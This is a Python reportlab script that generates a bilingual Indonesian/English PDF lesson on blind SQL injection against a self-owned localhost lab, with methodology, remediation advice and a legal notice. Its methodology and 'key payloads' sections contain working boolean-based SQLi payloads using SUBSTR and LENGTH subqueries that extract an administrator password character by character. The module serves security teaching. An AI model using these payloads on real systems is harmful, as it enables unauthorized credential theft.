# -*- coding: utf-8 -*-
"""Modul VER-03 (Blind SQLi) - gaya GENETEC monokrom, 2 file _ID/_EN."""
from reportlab.lib.colors import HexColor
from reportlab.lib.styles import ParagraphStyle
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                TableStyle, Preformatted, HRFlowable)

pdfmetrics.registerFont(TTFont("Sans",  "C:/Windows/Fonts/segoeui.ttf"))
pdfmetrics.registerFont(TTFont("SansB", "C:/Windows/Fonts/segoeui b.ttf".replace(" ", ""), ))
pdfmetrics.registerFont(TTFont("Mono",  "C:/Windows/Fonts/consola.ttf"))
pdfmetrics.registerFont(TTFont("MonoB", "C:/Windows/Fonts/consolab.ttf"))

BG, BOX = HexColor("#f5f5f5"), HexColor("#ececec")
INK, GRAY, LINE = HexColor("#111111"), HexColor("#777777"), HexColor("#cccccc")
PW, PH = 612, 792


def spaced(t):
    return " ".join(list(t.replace(" ", "  ")))


def styles():
    s = {}
    s["word"] = ParagraphStyle("w", fontName="SansB", fontSize=16, leading=18)
    s["mono"] = ParagraphStyle("m", fontName="Mono", fontSize=9, leading=13)
    s["h"] = ParagraphStyle("h", fontName="SansB", fontSize=10, leading=13,
                            spaceBefore=14, spaceAfter=5)
    s["body"] = ParagraphStyle("b", fontName="Sans", fontSize=10, leading=14.5)
    s["note"] = ParagraphStyle("n", fontName="Sans", fontSize=8.5, leading=12, textColor=GRAY)
    s["code"] = ParagraphStyle("c", fontName="Mono", fontSize=8.0, leading=11.2,
                               backColor=BOX, borderPadding=5, borderWidth=0.4,
                               borderColor=LINE, spaceBefore=3, spaceAfter=3)
    return s


def paint_bg(can, doc):
    can.saveState()
    can.setFillColor(BG)
    can.rect(0, 0, PW, 792, fill=1, stroke=0)
    can.setFont("Mono", 7.5)
    can.setFillColor(GRAY)
    can.drawString(60, 34, "verzen · web security learning modules · VER-03")
    can.drawRightString(PW - 60, 34, f"page {can.getPageNumber()}")
    can.restoreState()


def build(lang):
    s = styles()
    S = []
    A = S.append
    ID = lang == "id"

    A(Paragraph("VERZEN", s["word"]))
    A(Spacer(1, 6))
    A(Paragraph(spaced("SECURITY LEARNING MODULE"), s["mono"]))
    A(Spacer(1, 10))
    meta = [
        ("REPORTER", "Verzen"),
        ("MODULE", "VER-03 - Blind SQL Injection (HARD)"),
        ("TARGET", "http://127.0.0.1:8012/track - lab lokal milik sendiri"),
        ("PREREQ", "VER-01, VER-02 (sudah selesai)"),
        ("METHOD", "Conditional response: membaca data via perbedaan perilaku halaman"),
    ]
    for label, val in meta:
        A(Paragraph(f'<font name="MonoB" size="9">{label}</font>  '
                    f'<font name="Mono" size="9">{val}</font>', s["mono"]))
        A(Spacer(1, 2))
    A(Spacer(1, 8))
    A(HRFlowable(width="100%", thickness=0.8, color=INK))
    A(Spacer(1, 4))

    A(Paragraph("SUMMARY", s["h"]))
    A(Paragraph(
        "Laboratorium ini TIDAK MENAMPILKAN data query dan TIDAK MENAMPILKAN error. "
        "Satu-satunya perbedaan: banner <b>Selamat datang kembali!</b> muncul atau tidak. "
        "Misi: tetap bisa membaca password administrator dengan mengubah query menjadi "
        "serangkaian pertanyaan benar/salah, satu karakter per pertanyaan."
        if ID else
        "This lab NEVER renders query data and never shows errors. The only visible "
        "difference: whether the <b>Welcome back!</b> banner appears. Goal: still read "
        "the administrator password by turning the query into a series of yes/no "
        "questions, one character at a time.", s["body"]))
    A(Spacer(1, 4))

    A(Paragraph("DESCRIPTION", s["h"]))
    if ID:
        A(Paragraph(
            "Parameter <font name='Mono' size='9'>TrackingId</font> digabung langsung ke SQL: "
            "baris ketemu = banner muncul; tidak / error = tanpa banner, tanpa pesan apapun "
            "(error ditelan server). Bandingkan VER-02: tidak ada tabel untuk melihat hasil, "
            "tidak ada error untuk dibaca - hanya SATU BIT informasi per request.", s["body"]))
    else:
        A(Paragraph(
            "The <font name='Mono' size='9'>TrackingId</font> parameter is concatenated "
            "into SQL: row found = banner; not found / error = no banner, no message "
            "(errors are swallowed server-side). Unlike VER-02 there is no rendered table "
            "and no error channel - only ONE BIT of information per request.", s["body"]))
    A(Preformatted(
        "GET /track?TrackingId=' + <SQL> --\n"
        "Server: SELECT tracking_id FROM tracking WHERE tracking_id = '<input>'\n"
        "Banner 'Selamat datang kembali!' = kondisi TRUE, tidak ada = FALSE", s["code"]))

    A(Paragraph("METHODOLOGY" if not ID else "METODOLOGI", s["h"]))
    steps = [
        ("1. Confirm injection", "abc123' AND '1'='1  vs  abc123' AND '1'='2 "
         "=> banner muncul vs hilang: oracle terbentuk."),
        ("2. Ask TRUE/FALSE questions", "abc123' AND SUBSTR((SELECT password FROM users "
         "WHERE username='administrator'),1,1)='F'-- => TRUE jika karakter ke-1 = F."),
        ("3. Measure length", "abc123' AND LENGTH((SELECT password FROM users "
         "WHERE username='administrator'))=N-- => geser N sampai TRUE."),
        ("4. Extract char by char", "loop posisi 1..N, tebak huruf a-z A-Z 0-9 {_-}: "
         "TRUE = benar, lalu lanjut karakter berikutnya."),
        ("5. Reassemble", "gabungkan semua karakter = password administrator lengkap."),
    ] if not ID else [
        ("1. Konfirmasi injeksi", "abc123' AND '1'='1  vs  abc123' AND '1'='2 "
         "=> banner muncul vs hilang: oracle siap."),
        ("2. Ajukan pertanyaan TRUE/FALSE", "abc123' AND SUBSTR((SELECT password FROM users "
         "WHERE username='administrator'),1,1)='F'-- => TRUE jika karakter ke-1 = F."),
        ("3. Ukur panjang", "abc123' AND LENGTH((SELECT password FROM users "
         "WHERE username='administrator'))=N-- => geser N sampai TRUE."),
        ("4. Ekstrak per karakter", "posisi 1..N, cobakan a-z A-Z 0-9 {_-}: "
         "TRUE = benar, lanjut karakter berikutnya."),
        ("5. Rakit ulang", "gabung semua karakter = password administrator utuh."),
    ]
    for i, (t, d) in enumerate(steps, 1):
        A(Paragraph(f"{t}", s["body"]))
        A(Paragraph(d, s["note"]))
        A(Spacer(1, 2))

    A(Paragraph("KEY PAYLOADS" if not ID else "PAYLOAD KUNCI", s["h"]))
    A(Preformatted(
        "TrackingId=abc123' AND (SELECT 'a')='a'--                    [oracle]\n"
        "TrackingId=abc123' AND LENGTH((SELECT password FROM users\n"
        "  WHERE username='administrator'))=17--                     [panjang]\n"
        "TrackingId=abc123' AND SUBSTR((SELECT password FROM users\n"
        "  WHERE username='administrator'),1,1)='F'--                [karakter 1]", s["code"]))
    A(Paragraph(
        "SQLite: SUBSTR(text,pos,len), LENGTH(text). MySQL: SUBSTRING/CHAR_LENGTH. "
        "PostgreSQL: SUBSTRING/LENGTH. Konsep sama, nama fungsi beda."
        if not ID else
        "SQLite: SUBSTR(teks,posisi,panjang), LENGTH(teks). MySQL: SUBSTRING/CHAR_LENGTH. "
        "PostgreSQL: SUBSTRING/LENGTH. Konsep sama, nama fungsi berbeda.", s["note"]))

    A(Paragraph("WHY BLIND MATTERS" if not ID else "MENGAPA BLIND PENTING", s["h"]))
    A(Paragraph(
        "Aplikasi nyata jarang menampilkan error atau hasil query. Tetap rentan = "
        "tetap bisa diekstrak, hanya lebih lambat: N karakter x ~70 tebakan. "
        "Di bounty nyata, bug blind seperti ini sering di-skip pemburu pemula - "
        "padahal dampaknya sama dengan UNION biasa."
        if ID else
        "Real apps rarely display errors or query output. Still vulnerable = still "
        "extractable, just slower: N chars x ~70 guesses. In real bug bounty, blind "
        "bugs are often skipped by juniors - yet the impact equals a plain UNION leak.",
        s["body"]))

    A(Paragraph("RECOMMENDATION" if not ID else "REKOMENDASI", s["h"]))
    recs = [
        "Parameterized query (placeholder ?) - memutus injeksi di akar.",
        "Jangan bedakan respons antara kondisi TRUE/FALSE yang lahir dari data.",
        "Rate-limit + monitoring pola request bernomor (brute karakter).",
    ] if ID else [
        "Parameterized queries (the ? placeholder) - kills injection at the root.",
        "Do not branch responses on conditions derived from SQL results.",
        "Rate-limit + monitor sequential guessing patterns.",
    ]
    for i, r in enumerate(recs, 1):
        A(Paragraph(f"{i}. {r}", s["body"]))
        A(Spacer(1, 2))

    A(Paragraph("LEGAL NOTICE" if not ID else "CATATAN HUKUM", s["h"]))
    A(Paragraph(
        "Lab milik sendiri di localhost untuk pembelajaran. Teknik yang sama "
        "kepada sistem orang lain tanpa izin tertulis = ilegal. Jalur legal: "
        "program bug bounty dengan scope jelas."
        if ID else
        "Own local lab on localhost for learning purposes. The same technique "
        "against other systems without written permission is illegal. Legitimate "
        "path: bug bounty programs with explicit scope.", s["body"]))

    out = (r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/MODUL-VER-03-BLIND-SQLI_ID.pdf"
           if ID else
           r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/MODUL-VER-03-BLIND-SQLI_EN.pdf")
    doc = SimpleDocTemplate(out, pagesize=(PW, 792), topMargin=56, bottomMargin=52,
                            leftMargin=60, rightMargin=60,
                            title=f"VER-03 Blind SQLi ({lang.upper()}) - Verzen")
    doc.build(S, onFirstPage=paint_bg, onLaterPages=paint_bg)
    print("OK:", out)


build("id")
build("en")
